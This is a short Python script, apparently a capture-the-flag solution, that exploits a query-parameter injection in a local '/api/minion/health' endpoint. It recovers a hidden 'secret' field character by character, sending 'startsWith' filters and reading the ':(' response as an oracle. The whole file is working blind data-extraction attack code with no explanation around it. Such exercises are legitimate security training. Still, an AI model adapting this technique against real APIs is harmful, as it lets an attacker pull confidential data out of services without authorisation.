import requests
import string
from urllib.parse import quote

url = "http://localhost:50000/api/minion/health"
charset = string.ascii_letters + string.digits + " {}_"

secret = ""
while True:
    for c in charset:
        search = secret + c
        res = requests.get(
            url
            + f"?where[secret][ startsWith ]={quote(search)}&attributes[0]=name&attributes[0]=not_feeling_well&raw=true"
        )
        if ":(" in res.text:
            secret += c
            print(secret)
            break

        if c == charset[-1]:
            exit()
